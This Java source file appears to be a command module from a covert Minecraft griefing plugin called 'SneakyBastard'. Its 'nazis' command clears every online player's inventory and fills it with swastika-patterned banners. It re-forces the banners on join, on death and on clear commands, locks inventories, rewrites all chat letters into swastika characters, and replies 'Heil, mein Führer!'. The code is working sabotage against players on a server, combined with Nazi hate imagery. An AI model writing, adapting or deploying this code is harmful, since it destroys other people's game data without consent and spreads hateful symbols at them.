package net.blackofworld.SneakyBastard.Commands.Griefing;

import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.DyeColor;
import org.bukkit.Material;
import org.bukkit.block.banner.Pattern;
import org.bukkit.block.banner.PatternType;
import org.bukkit.entity.Player;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BannerMeta;

import java.util.ArrayList;

@CommandInfo(command = "nazis", description = "Put nazi sign on people's heads", syntax = "", category = CommandCategory.Griefing)
@ExtensionMethod({Player.class, PlayerExt.class})
public class Nazis extends CommandBase {
    private final ItemStack[] banner = new ItemStack[2];
    private boolean on;

    public Nazis() {
        this.banner[0] = new ItemStack(Material.RED_BANNER, 16);
        this.banner[1] = new ItemStack(Material.RED_BANNER, 16);

        BannerMeta bannerMeta1 = (BannerMeta) this.banner[0].getItemMeta();
        BannerMeta bannerMeta2 = (BannerMeta) this.banner[1].getItemMeta();
        if (bannerMeta1 == null || bannerMeta2 == null) return;
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_CENTER));
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.RHOMBUS_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.STRAIGHT_CROSS));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_LEFT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.HALF_HORIZONTAL));
        bannerMeta2.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.SQUARE_BOTTOM_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.SQUARE_BOTTOM_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRAIGHT_CROSS));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.SQUARE_TOP_LEFT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.BORDER));
        this.banner[0].setItemMeta(bannerMeta1);
        this.banner[1].setItemMeta(bannerMeta2);
    }

    private void givePlayerBanners(Player pe) {
        if (!pe.isOnline()) return;
        for (int i = 0; i <= 40; i += 2)
            pe.getInventory().setItem(i, banner[0]);
        for (int i = 1; i <= 40; i += 2)
            pe.getInventory().setItem(i, banner[1]);
    }

    @Override
    public void Execute(Player p, ArrayList<String> args) {
        if (on) {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                pe.getInventory().clear();
            }
            on = false;
            //this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.RED + " disabled Nazis!");
            p.Reply(ChatColor.RED + "Oof");
        } else {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                givePlayerBanners(pe);
            }
            //this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.RED + " enabled Nazis!");
            p.Reply(ChatColor.GREEN + "Heil, mein Führer!");
            on = true;
        }
    }

    public void onPlayerJoin(PlayerJoinEvent e) {
        if (!on) return;
        Player pe = e.getPlayer();
        givePlayerBanners(pe);
    }


    public void onPlayerDeath(PlayerDeathEvent e) {
        if (!on) return;
        givePlayerBanners(e.getEntity());
    }

    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        if (!on) return;
        if (!e.getMessage().contains("inventory") && !e.getMessage().contains("clear") && !e.getMessage().contains("clean"))
            return;
        Bukkit.getScheduler().runTask(this.Instance(), () -> {
            Player pe = e.getPlayer();
            givePlayerBanners(pe);
        });
    }

    public void onBlockPlace(BlockPlaceEvent e) {
        if (!on) return;
        e.getItemInHand().setAmount(16);
    }

    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        if (!on) return;
        e.setMessage(e.getMessage().replaceAll("[a-zA-Z]", "卐"));
    }

    public void onInventoryClick(InventoryClickEvent e) {
        if (!on) return;
        e.setCancelled(true);
    }

    public void onPlayerDropItemEvent(PlayerDropItemEvent e) {
        if (!on) return;
        e.setCancelled(true);
    }
}